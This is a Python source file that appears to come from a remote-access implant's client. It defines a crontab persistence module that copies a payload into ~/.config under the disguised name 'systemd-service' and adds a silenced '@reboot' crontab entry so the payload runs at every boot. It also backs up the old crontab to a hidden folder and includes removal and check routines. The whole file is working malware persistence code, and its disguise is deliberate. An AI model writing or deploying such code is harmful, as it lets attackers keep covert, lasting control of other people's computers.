import os
import subprocess

from client.modules.persist.manager import PersistenceMethod, PersistenceResult, _copy_payload


class CrontabPersistence(PersistenceMethod):
    name = 'crontab'

    def __init__(self):
        self._dest_dir = os.path.expanduser('~/.config')
        self._backup_dir = os.path.expanduser('~/.config/.cronbackup')

    def install(self, payload_name: str = 'systemd-service') -> PersistenceResult:
        try:
            os.makedirs(self._dest_dir, exist_ok=True)
            payload_path = os.path.join(self._dest_dir, payload_name)

            _copy_payload(payload_path)

            existing = self._read_crontab()
            entry = f'@reboot {payload_path} >/dev/null 2>&1'

            if entry in existing:
                return PersistenceResult(
                    True, 'crontab',
                    f'[+] Crontab entry already exists for {payload_name}',
                    payload_path
                )

            self._backup_crontab(existing)
            new_crontab = existing + '\n' + entry + '\n'

            result = subprocess.run(
                ['crontab', '-'],
                input=new_crontab,
                capture_output=True,
                text=True,
                timeout=10,
            )

            if result.returncode != 0:
                return PersistenceResult(
                    False, 'crontab',
                    f'[-] Failed to install crontab: {result.stderr.strip()}',
                    payload_path
                )

            verified = self._verify_entry(entry)
            if not verified:
                return PersistenceResult(
                    False, 'crontab',
                    '[-] Crontab entry not found after install — may have been rejected',
                    payload_path
                )

            return PersistenceResult(
                True, 'crontab',
                f'[+] Crontab persistence installed: {payload_name}',
                payload_path,
                '@reboot entry created, verified'
            )
        except Exception as e:
            return PersistenceResult(False, 'crontab', f'[-] Crontab error: {str(e)}')

    def remove(self, payload_name: str = 'systemd-service') -> PersistenceResult:
        try:
            existing = self._read_crontab()
            entry = f'@reboot {os.path.join(self._dest_dir, payload_name)} >/dev/null 2>&1'
            if entry not in existing:
                return PersistenceResult(True, 'crontab', '[-] No crontab entry found to remove')

            new_crontab = '\n'.join(
                line for line in existing.split('\n')
                if payload_name not in line
            ) + '\n'

            subprocess.run(
                ['crontab', '-'],
                input=new_crontab,
                capture_output=True,
                text=True,
                timeout=10,
            )

            try:
                os.remove(os.path.join(self._dest_dir, payload_name))
            except Exception:
                pass

            return PersistenceResult(True, 'crontab', f'[+] Crontab persistence removed: {payload_name}')
        except Exception as e:
            return PersistenceResult(False, 'crontab', f'[-] Crontab remove error: {str(e)}')

    def check(self) -> PersistenceResult:
        try:
            existing = self._read_crontab()
            entries = [l for l in existing.split('\n') if '@reboot' in l and l.strip()]
            if entries:
                return PersistenceResult(
                    True, 'crontab',
                    f'[+] Found {len(entries)} crontab entry(ies)',
                    details='\n'.join(entries)
                )
            return PersistenceResult(True, 'crontab', '[-] No crontab entries found')
        except Exception as e:
            return PersistenceResult(False, 'crontab', f'[-] Crontab check error: {str(e)}')

    def _read_crontab(self) -> str:
        try:
            result = subprocess.run(
                ['crontab', '-l'],
                capture_output=True,
                text=True,
                timeout=5,
            )
            return result.stdout if result.returncode == 0 else ''
        except Exception:
            return ''

    def _backup_crontab(self, content: str):
        try:
            os.makedirs(self._backup_dir, exist_ok=True)
            import time
            ts = int(time.time())
            with open(os.path.join(self._backup_dir, f'crontab_{ts}.bak'), 'w') as f:
                f.write(content or '# empty crontab\n')
        except Exception:
            pass

    def _verify_entry(self, entry: str) -> bool:
        try:
            current = self._read_crontab()
            return entry in current
        except Exception:
            return False
